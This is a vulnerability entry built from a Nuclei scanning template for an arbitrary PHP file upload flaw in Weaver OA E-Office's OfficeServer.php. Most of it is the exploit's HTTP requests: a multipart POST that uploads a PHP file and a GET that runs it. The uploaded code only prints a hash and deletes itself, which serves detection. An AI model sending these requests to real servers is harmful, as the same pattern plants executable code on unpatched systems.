# Vulnerability: OA E-Office OfficeServer.php Arbitrary File Upload
**Classification:** WEAVER
**Source:** Nuclei Template (`weaver-office-server-file-upload.yaml`)

## Description
OA E-Office OfficeServer.php has an arbitrary file upload vulnerability. Attackers can obtain sensitive information on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLpoiBFy4ANA8daew

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name="FileData";filename="{{filename}}.php"
Content-Type: application/octet-stream

<?php echo md5("{{string}}");unlink(__FILE__);?>

------WebKitFormBoundaryLpoiBFy4ANA8daew
Content-Disposition: form-data;name="FormData"

{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'{{filename}}.php'}
------WebKitFormBoundaryLpoiBFy4ANA8daew--

GET /eoffice10/server/public/iWebOffice2015/Document/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

